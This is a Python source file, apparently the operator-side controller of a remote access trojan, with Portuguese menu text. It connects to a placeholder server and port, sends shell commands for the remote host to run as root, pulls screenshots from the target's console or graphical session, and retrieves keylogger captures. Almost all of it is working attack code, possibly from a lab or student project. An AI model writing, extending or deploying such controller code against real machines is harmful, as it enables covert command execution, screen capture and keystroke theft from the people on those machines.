import socket
import os
import subprocess
from time import sleep

def command(conn):
    print("Envie um comando a ser executado ou 'quit' para encerrar a conexão")
    while True:        
        cmd = input("root@vm-ubuntu# ")
        conn.sendall(cmd.encode('utf-8'))
        if cmd.strip() == "quit":
            break
        else:
            fileSize = 0
            data = conn.recv(1024)
            try:
                fileSize = int(data.decode('utf-8').rstrip('\x00'))
            except:
                pass
            count = 0
            while (count < fileSize):
                data = conn.recv(1024)
                count += len(data)
                print(data.decode('utf-8').rstrip('\x00'))
                
def screenshot(file):
    fileSize = 0
    data = conn.recv(1024)
    try:
        fileSize = int(data.decode('utf-8').rstrip('\x00'))
    except:
        pass
    count = 0
    while (count < fileSize):
        data = conn.recv(1024)
        count += len(data)
        # Writes the received message
        file.write(data.rstrip(b'\x00'))
    print("Screenshot finalizado com sucesso.")

def keyboard():
    data = conn.recv(1024)
    # Decodes and displays the received message
    received_msg = data.decode('utf-8').rstrip('\n\x00')
    print(received_msg)

# Sets the IP address and port to which the host will connect to
SERVER = 'SERVER_IP'
PORT = SERVER_PORT

# Creates a TCP socket
conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Associates the socket with the specified IP address and port
conn.connect((SERVER, PORT))

i = 0
j = 0

# Main loop for sending and receiving messages
while True:
    print(">>> Escolha uma das seguintes opções <<<")
    print("[1] Enviar comandos de console")
    print("[2] Tirar screenshot (não compatível com interface gráfica)")
    print("[3] Tirar screenshot (interface gráfica em espaço de usuário)")
    print("[4] Recuperar inputs de usuário")
    print("[5] Encerrar conexão")

    try:
        num = int(input())
        if num not in [1,2,3,4,5]:
            raise ValueError
    except ValueError:
        print("Invalid input. Please enter a valid integer.")
        continue
    
    # Shell command
    if num == 1:
        cmd = "1\n"
        conn.sendall(cmd.encode('utf-8'))
        command(conn)
    # PPM screenshot (not compatible with graphic interfce)
    elif num == 2:
        file_path = "./temp.txt"
        file = open(file_path, 'ab')
        screenshot_path = f"./screenshot{i}.ppm"
        i += 1
        cmd = "2\n"
        conn.sendall(cmd.encode('utf-8'))
        screenshot(file)
        file.close()
        hexdump_command = "xxd -r -p " + file_path + " > " + screenshot_path
        subprocess.Popen(hexdump_command, shell=True).communicate()
        os.remove(file_path)
    # PNG screenshot
    elif num == 3:
        file_path = "./temp2.txt"
        file = open(file_path, 'ab')
        screenshot_path = f"./screenshot{j}.png"
        j += 1
        cmd = "3\n"
        conn.sendall(cmd.encode('utf-8'))
        user = input("Escreva o nome do usuário normal: ")
        conn.sendall(user.encode('utf-8'))
        screenshot(file)
        file.close()
        hexdump_command = "xxd -r -p " + file_path + " > " + screenshot_path
        subprocess.Popen(hexdump_command, shell=True).communicate()
        os.remove(file_path)
    # Keylogger
    elif num == 4:
        cmd = "4\n"
        conn.sendall(cmd.encode('utf-8'))
        print(">>> Recuperando keylogger... <<<")
        keyboard()
        print(">>> Keylogger recuperado. <<<")
    # End connection
    else:
        print(">>> Encerrando conexão <<<")
        cmd = "5\n"
        conn.sendall(cmd.encode('utf-8')) 
        break

sleep(1)

# Close the connection
conn.close()
